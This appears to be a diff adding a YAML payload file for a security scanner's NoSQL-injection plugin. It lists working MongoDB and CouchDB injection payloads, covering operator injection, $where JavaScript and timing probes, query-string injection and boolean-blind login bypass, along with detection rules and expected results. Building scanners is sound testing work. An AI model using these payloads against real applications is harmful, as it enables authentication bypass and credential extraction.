@@ -1,0 +1,91 @@
+# NoSQLi Payloads Database
+# Plugin: core.injection.nosqli
+
+plugin_id: core.injection.nosqli
+mutation_type: field_injection
+payload_type: nosqli
+
+variants:
+  # Variant 1: Operator injection (dict payloads)
+  - id: operator_injection
+    payloads:
+      - {"$gt": ""}
+      - {"$ne": null}
+      - {"$regex": ".*"}
+      - {"$exists": true}
+    tech_stack: [mongodb, couchdb]
+    confidence_boost: 0.20
+    detection: body_matches_any(uid=, admin, authenticated, _id)
+    auto_variants:
+      encoding_chains:
+        - [json_unicode]
+        - [url_encode]
+      obfuscation: []
+      max_combinations: 8
+
+  # Variant 2: JavaScript injection (MongoDB $where)
+  - id: javascript_injection
+    payloads:
+      - {"$where": "1==1"}
+      - {"$where": "this.password.match(/.*/)"}
+      - {"$where": "sleep(5000)"}
+    tech_stack: [mongodb]
+    confidence_boost: 0.25
+    detection: timing_delta > 4000 OR body_matches_any(uid=, authenticated)
+    auto_variants:
+      encoding_chains:
+        - [json_unicode]
+      obfuscation: []
+      max_combinations: 6
+
+  # Variant 3: Query string injection
+  - id: querystring_injection
+    payloads:
+      - "[$ne]=1"
+      - "[$gt]="
+      - "[$regex]=.*"
+      - "[$where]=1==1"
+    tech_stack: [mongodb, couchdb]
+    confidence_boost: 0.18
+    detection: body_matches_any(uid=, admin, authenticated)
+    auto_variants:
+      encoding_chains:
+        - [url_encode]
+      obfuscation: []
+      max_combinations: 6
+
+  # Variant 4: Boolean blind
+  - id: boolean_blind
+    payloads:
+      - {"username": {"$regex": "^a.*"}, "password": {"$gt": ""}}
+      - {"username": {"$nin": [""]}, "password": {"$ne": null}}
+    tech_stack: [mongodb]
+    confidence_boost: 0.15
+    detection: response_diff > 0.3
+    auto_variants:
+      encoding_chains: []
+      obfuscation: []
+      max_combinations: 4
+
+keywords:
+  - username
+  - user
+  - email
+  - password
+  - login
+  - filter
+  - query
+  - search
+  - id
+  - where
+
+expected_results:
+  operator_injection:
+    indicator: auth_bypass
+    expected_output: "authenticated"
+  javascript_injection:
+    indicator: code_execution OR timing_anomaly
+    expected_output: "uid="
+  querystring_injection:
+    indicator: auth_bypass
+    expected_output: "admin"
